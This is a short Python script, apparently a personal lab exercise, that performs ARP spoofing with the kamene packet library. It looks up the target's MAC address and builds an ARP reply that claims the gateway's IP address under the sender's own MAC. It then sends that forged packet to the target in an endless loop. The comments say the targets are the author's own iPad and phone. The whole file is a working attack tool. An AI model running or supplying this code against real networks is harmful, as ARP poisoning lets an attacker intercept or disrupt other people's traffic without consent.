"""
    Implemented by Jiahe Chen.
"""
import sys
import signal
import yaml
from kamene.all import (
  ARP,
  Ether,
  sendp,
  getmacbyip,
  get_if_hwaddr,
)

def build_packet(TargetIp, GateWayAddr):
    """Build ARP packet
    Args:
        TargetIp: The ipv4 address of attacked target.(In this case, my iPad)
        GateWayAddr: The ipv4 address of gateway.(In this case, my phone)
    """
    print("[-] Obtaining mac from {}".format(TargetIp))
    ## Get mac address of target(from ipv4 address)
    TargetMacAddr = None
    while not TargetMacAddr:
        TargetMacAddr = getmacbyip(TargetIp)
    print("Mac address of target:{}".format(TargetMacAddr))
    ## Get mac address of hacker(from interface)
    MyMacAddr = get_if_hwaddr("wlp1s0")
    print("Mac address of hacker:{}".format(MyMacAddr))
    ## Make Ether packet
    pkt = Ether(src=MyMacAddr, dst=TargetMacAddr) / ARP(hwsrc=MyMacAddr, psrc=GateWayAddr, hwdst=TargetMacAddr, pdst=TargetIp)
    pkt.show()
    return pkt

def stop(signal,frame):
    sys.exit(0)

if __name__ == '__main__':
    ## Get basic ip address from config.yaml
    TargetIp = "192.168.41.208"
    GateWayAddr = "192.168.41.205"
    ## When the connection get interupted, exit the script
    signal.signal(signal.SIGINT, stop)
    ## Build Ether packet
    packet = build_packet(TargetIp, GateWayAddr)
    ## ARP spoof: keep sending packets
    while True:
        sendp(packet, inter=2, iface="wlp1s0") #inter表示发送包的间隔,iface表示我们的网卡
